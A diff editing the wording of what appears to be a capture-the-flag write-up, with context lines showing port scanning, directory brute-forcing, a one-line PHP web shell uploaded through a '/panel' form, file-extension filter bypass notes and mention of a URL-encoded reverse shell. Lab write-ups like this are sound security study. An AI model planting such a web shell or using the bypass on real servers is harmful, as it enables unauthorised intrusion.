@@ -28,7 +28,7 @@ nmap -sS -sV -sC -T4 <IP>
 
 ## 🌐 Web Enumeration
 
-Performed manual inspection of the website — very basic static content, no clear entry points. Moved on to directory brute-forcing.
+Performed manual inspection of the website and only found very basic static content, no clear entry points. Moved on to directory brute-forcing.
 
 ~~~bash
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
@@ -48,7 +48,7 @@ Visited `/panel` and tested uploading a basic PHP webshell:
 <?php system($_GET["cmd"]); ?>
 ~~~
 
-Initial upload attempt failed — likely due to file extension filtering.
+Initial upload attempt failed which was likely due to file extension filtering.
 
 Tested:
 - `.php` → blocked  
@@ -144,4 +144,4 @@ cat /root/root.txt
 - File upload filters can often be bypassed using lesser-known extensions like `.php5`  
 - Public upload directories paired with weak validation are high-risk entry points  
 - GTFOBins is an essential resource for privilege escalation  
-- Always test multiple payload delivery methods — URL encoding made the reverse shell work  
+- Always test multiple payload delivery methods as URL encoding made the reverse shell work  
